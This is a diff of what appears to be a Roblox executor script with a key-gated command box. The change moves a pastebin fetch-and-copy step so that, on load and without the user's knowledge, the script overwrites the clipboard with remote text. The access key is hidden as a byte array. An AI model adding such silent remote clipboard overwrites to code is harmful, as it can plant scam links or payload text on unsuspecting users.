@@ -4,6 +4,11 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
+local success, content = pcall(game.HttpGet, game, "https://pastebin.com/raw/STihuXq8")
+if success and content and setclipboard then 
+    setclipboard(content) 
+end
+
 local IsAuthenticated = false
 local SharedUsers = {}
 local _secret = {78, 111, 116, 65, 75, 101, 121}
@@ -107,8 +112,6 @@ CmdInput.FocusLost:Connect(function(enter)
                 CmdInput.PlaceholderText = "READY | /vote, /unvote, /share, /unload"
                 CmdInput.TextColor3 = Color3.new(1, 1, 1)
                 CmdInput.Text = ""
-                local s, c = pcall(game.HttpGet, game, "https://pastebin.com/raw/STihuXq8")
-                if s and c and setclipboard then setclipboard(c) end
             else
                 CmdInput.Text = ""
                 CmdInput.PlaceholderText = "WRONG KEY"
